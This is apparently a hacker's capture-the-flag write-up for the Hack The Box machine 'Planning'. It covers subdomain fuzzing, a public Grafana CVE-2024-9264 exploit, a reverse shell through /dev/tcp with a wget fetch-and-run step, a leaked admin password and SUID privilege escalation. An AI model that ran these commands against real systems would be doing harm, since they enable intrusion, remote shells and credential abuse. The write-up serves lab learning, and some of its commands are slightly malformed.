# Planning - No Walkthrough (Active Machine)

## 🔍 Initial Enumeration

Trying to see all the active services using:

```bash
nmap -p- -sV -sC --min-rate 500 10.10.11.68
```

Results show an SSH service and a HTTP server.  
The HTTP server redirects to:  
**http://planning.htb/**

Now added the `http://planning.htb/` and `10.10.11.68` to `/etc/hosts` so that it shows the site.

## 🗂 Gobuster and Directory/Subdomain Discovery

Used `gobuster` to check for any subdomains and also any directories but nothing useful.

I found a PHP file called `details.php` which takes you to an `enroll.php` that contains a form for fullname, email, and phone no.  
Except for email, nothing is validated.  
Tried to pass quotes to try for SQL injection to get an error but only showing “successful”.

Tried subdomain fuzzing - no dice with `bug-bounty-program-subdomains-trickest-inventory.txt`

Directory fuzzing - got nothing useful.

Checked online for any hints - there was a hint to keep trying subdomain fuzzing with other wordlists.

## 🔄 Switching Tools - Trying FFUF

I am going to try using `ffuf` instead of gobuster this time:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u 'http://planning.htb' -H "Host:FUZZ.planning.htb"
```

Found a `grafana` subdomain 🎯

## 📦 Grafana Vulnerability & Exploitation

Checked the version of Grafana using `/api/health` - got response with version as `v11.0.0`

Googled for any vulnerabilities for this particular version and found:  
**CVE-2024-9264**

Found a working exploit at:  
https://github.com/nollium/CVE-2024-9264.git

Cloned it and used:

```bash
python3 CVE-2024-9264.py -u user -p user -c <shell-cmd> <url>
```

Passed `id` in the `-c` and I see that I have **root access**

## 🔁 Reverse Shell Setup

Now I am going to do reverse shell.

Started a port using:

```bash
nc -lvnp 4444
```

Created a file:

```bash
echo bash -i >& /dev/tcp/10.10.14.96/4444 0>&1 > shell.sh
```

Hosted it using:

```bash
python3 -m http-server 8000
```

Then passed this `wget` command through duckdb using the CVE exploit:

```bash
wget http://10.10.14.96:8000/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && bash /tmp/shell.sh
```

We got the shell access 🎉

Went through most files, couldn’t find a user flag or root flag.

## 🧪 Post Exploitation - LinPEAS & Enumeration

Looks like this is not it. Need to run **LinPEAS** to check.

Downloaded `linpeas.sh` in attacker machine, hosted it same as the shell file, and used `wget` from reverse shell.

Then did:

```bash
chmod +x linpeas.sh
```

First time using linpeas so had to research what to check.

Could see that we are in a **Docker container** and not on the host — container escape maybe?

In the LinPEAS report I could see all the env variables and in it I found some interesting stuff:

```env
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
```

## 🔐 SSH Access

Tried it in the Grafana login - no dice.

Tried it as an SSH user for the SSH found during Nmap enumeration:

```bash
ssh enzo@<IPADDRESS>
```

Put in the password — I’m **logged in** 🧑‍💻  
**Found my first user flag** for an active machine!

## ⚙️ Privilege Escalation

Ran `linpeas` again — noticed there was a file with **SUID attached**:

```bash
/tmp/bash
```

Ran:

```bash
/tmp/bash -p
```

Got **root access** 🎯

```bash
cat /root/root.txt
```

**Got the root flag** — Machine **pawned** 💀